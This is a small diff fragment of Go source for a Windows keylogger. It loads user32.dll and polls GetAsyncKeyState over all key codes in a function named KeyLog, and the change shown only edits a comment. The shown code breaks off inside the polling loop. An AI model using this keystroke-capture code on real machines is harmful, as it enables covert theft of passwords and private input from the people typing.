@@ -11,7 +11,7 @@ var moduser32 = syscall.NewLazyDLL("user32.dll")
 // Load function from dll
 var procGetAsyncKeyState = moduser32.NewProc("GetAsyncKeyState")
 
-// KeyLog takes a file and writes the logged characters
+// KeyLog takes a readWriter and writes the logged characters
 func KeyLog(rw io.ReadWriter) (err error) {
 	for i := 0; i < 0xFF; i++ {
 		asynch, _, _ := syscall.Syscall(procGetAsyncKeyState.Addr(), 1, uintptr(i), 0, 0)
